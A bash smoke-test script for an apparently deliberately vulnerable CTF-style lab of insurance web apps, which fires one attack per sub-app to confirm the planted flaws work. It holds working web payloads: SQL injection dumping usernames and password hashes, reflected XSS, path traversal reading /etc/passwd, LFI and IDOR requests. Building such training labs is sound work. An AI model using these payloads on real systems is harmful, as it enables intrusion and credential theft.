#!/usr/bin/env bash
# =============================================================================
# smoke-test.sh — fire one attack per sub-app to confirm the install works
# =============================================================================

set -uo pipefail

ok=0; fail=0
check() {
    local name="$1" url="$2" pattern="$3"
    body=$(curl -s "$url")
    if echo "$body" | grep -qE "$pattern"; then
        echo "  [OK]   $name"
        ok=$((ok+1))
    else
        echo "  [FAIL] $name"
        echo "         URL    : $url"
        echo "         expect : $pattern"
        fail=$((fail+1))
    fi
}

echo ">>> ICP smoke test"
echo

echo "1. policies.icp.lab"
check "ICP_11 (SQLi UNION on plan)" \
    "http://policies.icp.lab/search.php?plan=x%27%20UNION%20SELECT%20id,name,premium,flag_note%20FROM%20policies--%20" \
    "silence1\{ICP_11_"
check "ICP_12 (reflected XSS)" \
    "http://policies.icp.lab/quote.php?age=%3Cscript%3Ealert(1)%3C/script%3E" \
    "<script>alert"
check "ICP_13 (dir listing on /docs/)" \
    "http://policies.icp.lab/docs/" \
    "(Index of|confidential_pricing)"
check "ICP_14 (outdated jQuery served)" \
    "http://policies.icp.lab/assets/js/jquery-1.7.2.min.js" \
    "v1\.7\.2"
check "ICP_15 (missing audit, flag in HTML comment)" \
    "http://policies.icp.lab/quote.php?age=30" \
    "silence1\{ICP_15_"

echo
echo "2. claims.icp.lab"
check "ICP_22 (path traversal -> /etc/passwd)" \
    "http://claims.icp.lab/attachment.php?file=../../../../../etc/passwd" \
    "root:x:0:0"
check "ICP_23 (LFI on tpl)" \
    "http://claims.icp.lab/claim_form.php?tpl=/etc/hostname" \
    "(template|claim form)"

echo
echo "3. status.icp.lab"
check "ICP_31 (IDOR on claim 5)" \
    "http://status.icp.lab/claim.php?id=5" \
    "silence1\{ICP_31_"
check "ICP_33 (SQLi on status filter)" \
    "http://status.icp.lab/list.php?status=approved%27%20OR%20%271%27=%271" \
    "silence1\{ICP_33_"
check "ICP_35 (.git/config exposed)" \
    "http://status.icp.lab/.git/config" \
    "silence1\{ICP_35_"

echo
echo "4. beneficiary.icp.lab"
check "ICP_41 (IDOR on nominee 2)" \
    "http://beneficiary.icp.lab/nominee.php?nid=2" \
    "Ravi Kumar"
check "ICP_45 (SQLi on q)" \
    "http://beneficiary.icp.lab/search_nominee.php?q=x%27%20UNION%20SELECT%20id,username,password_md5,email%20FROM%20users--%20" \
    "silence1\{ICP_45_"

echo
echo "5. admin.icp.lab"
check "ICP_51 (BAC on /admin/)" \
    "http://admin.icp.lab/admin/index.php" \
    "silence1\{ICP_51_"
check "ICP_54 (SQLi on admin find)" \
    "http://admin.icp.lab/admin/find.php?q=x%27%20UNION%20SELECT%20username,password_md5,role,email%20FROM%20users--%20" \
    "silence1\{ICP_54_"

echo
echo "6. icp.lab (Shikra Insurance landing)"
check "ICP_56 (reflected XSS in press search)" \
    "http://icp.lab/press/?search=%3Cscript%3Ealert(1)%3C/script%3E" \
    "<script>alert"
check "Landing home page renders" \
    "http://icp.lab/" \
    "Shikra"

echo
echo "----------------------------------------"
echo "  PASS: $ok    FAIL: $fail"
echo "----------------------------------------"
[[ $fail -eq 0 ]] || exit 1
